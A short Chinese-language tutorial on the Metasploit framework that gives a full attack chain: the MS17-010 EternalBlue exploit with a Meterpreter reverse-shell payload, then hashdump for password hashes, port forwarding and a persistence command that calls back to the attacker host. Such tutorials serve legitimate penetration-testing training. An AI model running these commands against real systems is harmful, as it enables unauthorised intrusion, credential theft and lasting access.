# Metasploit渗透测试框架使用

Metasploit是世界上最流行的渗透测试框架。

## 架构

### 模块类型
- **Exploit**：漏洞利用模块
- **Payload**：攻击载荷
- **Auxiliary**：辅助模块（扫描、嗅探）
- **Encoder**：编码器模块
- **Post**：后渗透模块

## 基本使用

### 1. 启动msfconsole
```bash
msfconsole
```

### 2. 搜索模块
```bash
search type:exploit name:smb
```

### 3. 使用模块
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### 4. Meterpreter后渗透
```bash
# 获取系统信息
sysinfo
# 获取密码哈希
hashdump
# 端口转发
portfwd add -l 3389 -p 3389 -r 192.168.1.100
# 持久化
run persistence -X -i 10 -p 4444 -r 192.168.1.50
```

## 常用漏洞模块
- MS17-010（永恒之蓝）
- CVE-2019-0708（RDP漏洞）
- WebLogic反序列化'